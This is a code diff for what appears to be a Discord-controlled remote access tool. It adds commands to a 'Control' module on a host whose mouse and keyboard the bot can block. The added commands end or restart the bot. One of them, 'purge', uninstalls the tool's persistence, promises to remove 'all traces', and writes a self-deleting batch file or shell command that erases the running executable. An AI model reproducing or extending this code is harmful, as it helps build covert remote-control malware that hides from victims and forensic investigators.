@@ -6,7 +6,9 @@ from discord.ext import commands
 import pyautogui
 import ctypes
 import threading
+import time
 from src.client.core.platform import Platform
+from src.client.core.persistence import Persistence
 
 class Control(commands.Cog):
     def __init__(self, bot):
@@ -95,6 +97,56 @@ class Control(commands.Cog):
             await ctx.send("🔓 Mouse and keyboard UNBLOCKED.")
         else:
             await ctx.send("❌ Not supported on this platform.")
+
+    @commands.command(name="endsession", aliases=["exit", "quit"], help="Cleanly close the bot on the host.")
+    async def end_session(self, ctx):
+        await ctx.send("⚓ **Session Ending.** Goodbye.")
+        await self.bot.close()
+        sys.exit(0)
+
+    @commands.command(name="restart", help="Restart the bot process.")
+    async def restart_bot(self, ctx):
+        await ctx.send("🔄 **Restarting bot...**")
+        try:
+            # Re-run the current executable
+            subprocess.Popen([sys.executable] + sys.argv)
+            await self.bot.close()
+            sys.exit(0)
+        except Exception as e:
+            await ctx.send(f"❌ Restart failed: {e}")
+
+    @commands.command(name="purge", help="EMERGENCY: Uninstall persistence and delete ALL bot files.")
+    async def purge(self, ctx):
+        await ctx.send("🧨 **PURGE INITIATED.** Removing all traces and self-destructing...")
+        
+        try:
+            # 1. Uninstall persistence
+            Persistence.uninstall()
+            
+            # 2. Identify files to delete
+            current_exe = sys.executable
+            
+            # 3. Create self-deletion script
+            if Platform.is_windows():
+                # Windows needs a bat file to delete the running EXE
+                bat_path = os.path.join(os.environ["TEMP"], "purge.bat")
+                with open(bat_path, "w") as f:
+                    f.write(f'@echo off\n')
+                    f.write(f'timeout /t 5 /nobreak > nul\n') # Wait for bot to exit
+                    f.write(f'del /f /q "{current_exe}"\n')
+                    f.write(f'del "%~f0"\n') # Delete this bat file
+                subprocess.Popen(["cmd.exe", "/c", bat_path], shell=True)
+            else:
+                # Linux can often delete its own binary while running or use a simple shell one-liner
+                cmd = f'sleep 5 && rm -f "{current_exe}"'
+                subprocess.Popen(cmd, shell=True)
+
+            await ctx.send("✅ Purge complete. Bot is exiting.")
+            await self.bot.close()
+            sys.exit(0)
+            
+        except Exception as e:
+            await ctx.send(f"❌ Purge Error: {e}")
 
 async def setup(bot):
     await bot.add_cog(Control(bot))
